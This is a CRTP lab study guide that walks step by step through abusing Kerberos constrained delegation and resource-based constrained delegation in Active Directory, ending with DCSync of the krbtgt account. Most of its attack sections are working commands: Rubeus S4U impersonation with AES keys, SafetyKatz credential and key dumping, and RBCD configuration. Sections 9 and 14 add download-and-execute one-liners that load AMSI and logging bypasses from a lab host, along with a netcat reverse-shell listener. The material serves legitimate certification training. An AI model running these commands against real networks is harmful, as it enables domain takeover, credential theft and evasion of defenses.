# CRTP – Constrained Delegation and Resource-Based Constrained Delegation (RBCD)

> **Purpose:**  
> This document explains the lab workflow for abusing **Constrained Delegation** and **Resource-Based Constrained Delegation (RBCD)** in an Active Directory environment.

---

## Table of Contents

1. [Constrained Delegation Overview](#1-constrained-delegation-overview)
2. [Enumerating Users with Constrained Delegation Enabled](#2-enumerating-users-with-constrained-delegation-enabled)
3. [Abusing User-Based Constrained Delegation](#3-abusing-user-based-constrained-delegation)
4. [Enumerating Computer Accounts with Constrained Delegation Enabled](#4-enumerating-computer-accounts-with-constrained-delegation-enabled)
5. [Abusing Computer-Based Constrained Delegation](#5-abusing-computer-based-constrained-delegation)
6. [Using LDAP Service Ticket for DCSync](#6-using-ldap-service-ticket-for-dcsync)
7. [Resource-Based Constrained Delegation Overview](#7-resource-based-constrained-delegation-overview)
8. [Finding Computer Objects Where We Have Write Permissions](#8-finding-computer-objects-where-we-have-write-permissions)
9. [Using Reverse Shell as ciadmin](#9-using-reverse-shell-as-ciadmin)
10. [Configuring RBCD on dcorp-mgmt](#10-configuring-rbcd-on-dcorp-mgmt)
11. [Dumping AES Keys of Student Machine Account](#11-dumping-aes-keys-of-student-machine-account)
12. [Abusing RBCD with Rubeus](#12-abusing-rbcd-with-rubeus)
13. [Constrained Delegation vs RBCD](#13-constrained-delegation-vs-rbcd)
14. [Command Summary](#14-command-summary)
15. [CRTP Exam Notes](#15-crtp-exam-notes)

---

# 1. Constrained Delegation Overview

## What is Constrained Delegation?

**Constrained Delegation** is an Active Directory Kerberos feature that allows a service account or computer account to impersonate users only to specific services.

Example:

```text
websvc → allowed to delegate to CIFS/dcorp-mssql
```

This means the account `websvc` can impersonate another user, such as `Administrator`, but only to the services configured in the account’s delegation settings.

---

## Why is it useful?

In real environments, delegation is used when one service needs to access another service on behalf of a user.

Example:

```text
User
 |
 v
Web Server
 |
 v
SQL Server
```

The web server may need to access the SQL Server as the user. Constrained delegation allows this, but only to specifically configured services.

---

## Important Attribute

The main attribute used in constrained delegation is:

```text
msDS-AllowedToDelegateTo
```

This attribute contains the list of SPNs that the account is allowed to delegate to.

---

## Important Kerberos Concepts

Constrained Delegation commonly uses:

- **S4U2Self**
- **S4U2Proxy**

### S4U2Self

Allows a service to request a service ticket to itself on behalf of a user.

### S4U2Proxy

Allows the service to request another service ticket to a backend service on behalf of that user.

---

# 2. Enumerating Users with Constrained Delegation Enabled

## Start Invisi-Shell

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

---

## Import PowerView

```powershell
. C:\AD\Tools\PowerView.ps1
```

or:

```powershell
. C:\AD\Tools\PowerView\PowerView.ps1
```

---

## Enumerate Users Trusted to Authenticate for Delegation

```powershell
Get-DomainUser -TrustedToAuth
```

---

## Purpose

This command enumerates domain user accounts that are trusted for constrained delegation with protocol transition.

These accounts usually have:

```text
TRUSTED_TO_AUTH_FOR_DELEGATION
```

and a populated:

```text
msDS-AllowedToDelegateTo
```

attribute.

---

## Expected Result

The output should show accounts such as:

```text
websvc
```

This means the account can be abused if we have its password, NTLM hash, AES key, or usable Kerberos material.

---

# 3. Abusing User-Based Constrained Delegation

## Scenario

We already have the secrets of `websvc` from the `dcorp-adminsrv` machine.

We will use `websvc` to request a service ticket as the Domain Administrator and access the filesystem service on `dcorp-mssql`.

---

## Target Service

The service we want to access is:

```text
CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

CIFS is used for file share access.

---

## Request a TGT and Service Ticket for Delegated Service

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

---

## Command Explanation

```text
s4u
```

Uses Rubeus S4U functionality.

```text
/user:websvc
```

Specifies the account that has constrained delegation enabled.

```text
/aes256:<AES key>
```

Uses the AES256 key of the `websvc` account.

```text
/impersonateuser:Administrator
```

Requests a ticket while impersonating the `Administrator` account.

```text
/msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL"
```

Specifies the service SPN that `websvc` is allowed to delegate to.

```text
/ptt
```

Pass-the-ticket. Injects the received ticket into the current session.

---

## Verify if the TGS is Injected

```powershell
klist
```

Expected ticket:

```text
CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

---

## Access the File System on dcorp-mssql

```cmd
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

---

## Expected Result

If the ticket is valid and injected properly, you should be able to access the `C$` admin share on `dcorp-mssql`.

---

## User-Based Constrained Delegation Attack Flow

```text
Compromise websvc
        |
        v
Obtain AES key of websvc
        |
        v
Use Rubeus S4U
        |
        v
Impersonate Administrator
        |
        v
Request TGS for CIFS/dcorp-mssql
        |
        v
Inject ticket using /ptt
        |
        v
Access \\dcorp-mssql\c$
```

---

# 4. Enumerating Computer Accounts with Constrained Delegation Enabled

## Command

```powershell
Get-DomainComputer -TrustedToAuth
```

---

## Purpose

This command enumerates computer accounts that have constrained delegation enabled.

Computer accounts can also be abused if we have their AES keys, NTLM hash, or usable Kerberos tickets.

---

## Important Point

A computer account ends with `$`.

Example:

```text
dcorp-adminsrv$
```

If this computer account is trusted for delegation, and we have its AES key, we can abuse it using Rubeus S4U.

---

# 5. Abusing Computer-Based Constrained Delegation

## Scenario

We have the AES key of the computer account:

```text
dcorp-adminsrv$
```

from the `dcorp-adminsrv` machine.

We will use this computer account to impersonate `Administrator` and request a service ticket to the Domain Controller.

---

## Important Service

The command requests a ticket for:

```text
time/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

Then it uses:

```text
/altservice:ldap
```

to obtain an LDAP usable ticket.

LDAP access to the Domain Controller is useful because DCSync requires communication with the Domain Controller.

---

## Request TGT and Service Ticket

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

---

## Command Explanation

```text
/user:dcorp-adminsrv$
```

The computer account being abused.

```text
/aes256:<AES key>
```

AES256 key of the computer account.

```text
/impersonateuser:Administrator
```

User we want to impersonate.

```text
/msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

SPN configured for constrained delegation.

```text
/altservice:ldap
```

Requests the ticket for an alternative service, LDAP.

```text
/ptt
```

Injects the ticket into the current session.

---

## Verify Ticket

```powershell
klist
```

Look for a ticket related to:

```text
ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

---

## Computer-Based Constrained Delegation Attack Flow

```text
Compromise dcorp-adminsrv$
        |
        v
Obtain AES key
        |
        v
Use Rubeus S4U
        |
        v
Impersonate Administrator
        |
        v
Request ticket to allowed SPN
        |
        v
Use /altservice:ldap
        |
        v
Inject LDAP ticket
        |
        v
Perform DCSync
```

---

# 6. Using LDAP Service Ticket for DCSync

## Objective

Use the injected LDAP service ticket to perform DCSync and retrieve the `krbtgt` hash.

---

## Command

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

---

## Purpose

This performs a DCSync attack to retrieve credential material for:

```text
dcorp\krbtgt
```

---

## Why krbtgt?

The `krbtgt` account signs Kerberos Ticket Granting Tickets.

If an attacker obtains the `krbtgt` hash or AES keys, they can forge Kerberos tickets such as Golden Tickets.

---

# 7. Resource-Based Constrained Delegation Overview

## What is RBCD?

**Resource-Based Constrained Delegation (RBCD)** is another form of Kerberos delegation.

The main difference is where the delegation permission is configured.

---

## Normal Constrained Delegation

In normal constrained delegation:

```text
The delegating account decides which services it can delegate to.
```

Example:

```text
websvc is allowed to delegate to CIFS/dcorp-mssql
```

---

## Resource-Based Constrained Delegation

In RBCD:

```text
The target computer decides who is allowed to delegate to it.
```

The important attribute is:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

If we can modify this attribute on a computer object, we can configure that computer to trust our controlled computer account.

---

## Example

```text
dcorp-mgmt trusts dcorp-studentx$
```

This means `dcorp-studentx$` can impersonate users to services on `dcorp-mgmt`.

---

# 8. Finding Computer Objects Where We Have Write Permissions

## Scenario

We have compromised the user:

```text
ciadmin
```

From enumeration or BloodHound, we discover that `ciadmin` has write permissions on the computer object:

```text
dcorp-mgmt
```

---

## Start Invisi-Shell

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

---

## Import PowerView

```powershell
. C:\AD\Tools\PowerView.ps1
```

---

## Find Interesting ACLs

```powershell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

---

## Purpose

This command checks for interesting permissions held by `ciadmin`.

We are looking for permissions like:

- GenericAll
- GenericWrite
- WriteDACL
- WriteOwner
- WriteProperty

These permissions may allow modification of a computer object.

---

## Expected Finding

```text
ciadmin has write permissions over dcorp-mgmt
```

This can be abused to configure RBCD.

---

# 9. Using Reverse Shell as ciadmin

## Scenario

We compromised `ciadmin` from `dcorp-ci`.

We can either:

- Use the reverse shell we already have on `dcorp-ci`
- Extract credentials from `dcorp-ci`

In this workflow, we use the reverse shell and load PowerView.

---

## Start Netcat Listener

```cmd
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

---

## Load Script Block Logging Bypass

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/sbloggingbypass.txt')
```

---

## Load AMSI Bypass

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/Amsi-Byp.txt')
```

---

## Load PowerView

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')
```

---

# 10. Configuring RBCD on dcorp-mgmt

## Objective

Configure `dcorp-mgmt` to allow the student VM machine account to act on behalf of other users.

Your student VM hostname may be:

```text
dcorp-studentx
```

or:

```text
dcorp-stdx
```

The machine account will be:

```text
dcorp-studentx$
```

or:

```text
dcorp-stdx$
```

---

## Set RBCD

```powershell
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
```

---

## Command Explanation

```text
-Identity dcorp-mgmt
```

The target computer object where we have write permissions.

```text
-DelegateFrom 'dcorp-studentx$'
```

The machine account that will be allowed to impersonate users to `dcorp-mgmt`.

```text
-Verbose
```

Shows detailed output.

---

## What Happens Internally?

This modifies the target computer object's:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

attribute.

After this, `dcorp-mgmt` trusts `dcorp-studentx$` for resource-based constrained delegation.

---

## Verify RBCD

```powershell
Get-DomainRBCD
```

---

## Expected Result

The output should show that:

```text
dcorp-studentx$
```

is allowed to act on behalf of other users to:

```text
dcorp-mgmt
```

---

# 11. Dumping AES Keys of Student Machine Account

## Objective

Since RBCD was configured for the student VM machine account, we need the AES key of the student VM machine account.

---

## Run from Elevated Shell

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

---

## Purpose

This dumps Kerberos keys from memory.

We are interested in the AES key of:

```text
dcorp-studentx$
```

---

## Why is the AES Key Needed?

Rubeus needs the key of the account performing delegation.

In this case:

```text
dcorp-studentx$
```

is the account allowed to delegate to:

```text
dcorp-mgmt
```

So we need the AES key of `dcorp-studentx$`.

---

# 12. Abusing RBCD with Rubeus

## Objective

Use Rubeus S4U to impersonate `administrator` to `dcorp-mgmt`.

---

## Command

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-studentx$ /aes256:bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

---

## Command Explanation

```text
/user:dcorp-studentx$
```

The machine account that is allowed to delegate to `dcorp-mgmt`.

```text
/aes256:<AES key>
```

The AES key of the student VM machine account.

```text
/msdsspn:http/dcorp-mgmt
```

The service ticket requested for the target computer.

```text
/impersonateuser:administrator
```

The user we want to impersonate.

```text
/ptt
```

Injects the ticket into the current session.

---

## Verify Ticket

```powershell
klist
```

Expected service ticket:

```text
HTTP/dcorp-mgmt
```

---

## Access dcorp-mgmt Using WinRS

```cmd
winrs -r:dcorp-mgmt cmd
```

---

## Verify User

```cmd
set username
```

Expected:

```text
USERNAME=administrator
```

---

## Verify Computer Name

```cmd
set computername
```

Expected:

```text
COMPUTERNAME=DCORP-MGMT
```

---

## RBCD Attack Flow

```text
Compromise ciadmin
        |
        v
Find write permission over dcorp-mgmt
        |
        v
Configure RBCD on dcorp-mgmt
        |
        v
Allow dcorp-studentx$ to delegate
        |
        v
Dump AES key of dcorp-studentx$
        |
        v
Use Rubeus S4U
        |
        v
Impersonate administrator
        |
        v
Request service ticket to dcorp-mgmt
        |
        v
Inject ticket
        |
        v
Access dcorp-mgmt using WinRS
```

---

# 13. Constrained Delegation vs RBCD

| Feature | Constrained Delegation | Resource-Based Constrained Delegation |
|---|---|---|
| Configured on | Delegating account | Target computer object |
| Important attribute | `msDS-AllowedToDelegateTo` | `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| Control required | Key/hash of delegated account | Write access over target computer object |
| Example account | `websvc` | `dcorp-studentx$` |
| Example target | `CIFS/dcorp-mssql` | `dcorp-mgmt` |
| Common abuse method | Rubeus S4U | Rubeus S4U |
| Impersonation target | Usually Administrator | Usually Administrator |

---

## Simple Difference

### Constrained Delegation

```text
The service account says:
"I am allowed to delegate to these services."
```

Example:

```text
websvc → CIFS/dcorp-mssql
```

---

### RBCD

```text
The target computer says:
"This account is allowed to act on behalf of users to me."
```

Example:

```text
dcorp-mgmt → trusts dcorp-studentx$
```

---

# 14. Command Summary

## Start Invisi-Shell

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

---

## Import PowerView

```powershell
. C:\AD\Tools\PowerView.ps1
```

or:

```powershell
. C:\AD\Tools\PowerView\PowerView.ps1
```

---

## Enumerate User Accounts with Constrained Delegation

```powershell
Get-DomainUser -TrustedToAuth
```

---

## Abuse User-Based Constrained Delegation

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

---

## Verify Ticket

```powershell
klist
```

---

## Access CIFS on dcorp-mssql

```cmd
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

---

## Enumerate Computer Accounts with Constrained Delegation

```powershell
Get-DomainComputer -TrustedToAuth
```

---

## Abuse Computer-Based Constrained Delegation with altservice

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

---

## Perform DCSync

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

---

## Find ACLs for ciadmin

```powershell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

---

## Start Netcat Listener

```cmd
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

---

## Load Script Block Logging Bypass

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/sbloggingbypass.txt')
```

---

## Load AMSI Bypass

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/Amsi-Byp.txt')
```

---

## Load PowerView Remotely

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')
```

---

## Configure RBCD

```powershell
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
```

---

## Verify RBCD

```powershell
Get-DomainRBCD
```

---

## Dump AES Keys

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

---

## Abuse RBCD

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-studentx$ /aes256:bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

---

## Access Target

```cmd
winrs -r:dcorp-mgmt cmd
```

---

## Verify Username

```cmd
set username
```

---

## Verify Computer Name

```cmd
set computername
```

---

# 15. CRTP Exam Notes

## Constrained Delegation

Remember:

```text
TrustedToAuth = Constrained Delegation with protocol transition
```

Important checks:

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

Important attributes:

```text
userAccountControl: TRUSTED_TO_AUTH_FOR_DELEGATION
msDS-AllowedToDelegateTo
```

---

## RBCD

Important attribute:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Important commands:

```powershell
Find-InterestingDomainACL
Set-DomainRBCD
Get-DomainRBCD
```

---

## Constrained Delegation Memory Trick

```text
Constrained Delegation:
The account is allowed to delegate to specific services.
```

Example:

```text
websvc → CIFS/dcorp-mssql
```

---

## RBCD Memory Trick

```text
RBCD:
The target computer decides who can delegate to it.
```

Example:

```text
dcorp-mgmt trusts dcorp-studentx$
```

---

# Final Takeaway

Constrained Delegation and RBCD both abuse Kerberos delegation, but the control point is different.

## Constrained Delegation

```text
Control delegated account + its key
        |
        v
Use S4U
        |
        v
Impersonate user
        |
        v
Access allowed service
```

## RBCD

```text
Control write permission over target computer object
        |
        v
Set msDS-AllowedToActOnBehalfOfOtherIdentity
        |
        v
Use controlled computer account
        |
        v
Impersonate Administrator
        |
        v
Access target machine
```
